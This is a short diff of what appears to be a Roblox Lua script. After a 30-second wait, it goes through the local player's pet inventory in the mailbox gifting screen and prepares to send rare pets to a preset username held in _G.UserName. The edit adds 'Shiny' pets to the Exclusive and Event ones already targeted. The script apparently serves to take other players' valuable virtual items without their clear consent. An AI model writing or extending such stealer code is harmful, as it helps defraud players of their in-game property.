@@ -66,7 +66,7 @@ end
 wait(30)
 for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
     if v:IsA("TextButton") then
-        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
+        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") or v:FindFirstChild("RarityGradient"):FindFirstChild("Shiny") then
             local args = {
                 [1] = {
                     ["Recipient"] = _G.UserName,
